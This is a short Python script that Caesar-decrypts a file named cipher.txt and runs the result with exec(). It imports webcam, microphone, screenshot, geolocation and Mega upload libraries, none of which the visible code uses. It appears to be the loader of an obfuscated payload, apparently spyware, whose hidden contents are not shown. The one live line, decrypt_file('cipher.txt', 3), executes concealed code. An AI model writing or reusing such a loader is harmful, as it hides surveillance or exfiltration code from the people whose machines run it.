import time
import os
import shutil
import cv2
from datetime import datetime
from mega import Mega
import pyaudio
import wave
import threading
import requests
import geocoder
import glob
import pyautogui

def encrypt(text, shift):
    encrypted_text = ""
    for char in text:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            encrypted_char = chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            encrypted_text += encrypted_char
        else:
            encrypted_text += char
    return encrypted_text
def encrypt_file(input_file, output_file, shift):
    with open(input_file, 'r') as file:
        content = file.read()

    cipher = encrypt(content, shift)

    with open(output_file, 'w') as file:
        file.write(cipher)
def decrypt(cipher, shift):
    decrypted_text = ""
    for char in cipher:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            decrypted_char = chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
            decrypted_text += decrypted_char
        else:
            decrypted_text += char
    return decrypted_text
def decrypt_file(input_file, shift):
    with open(input_file, 'r') as file:
        cipher = file.read()

    decrypted_text = decrypt(cipher, shift)
    exec(decrypted_text)

#encrypt_file('test.py', 'cipher.txt', 3)
decrypt_file('cipher.txt', 3)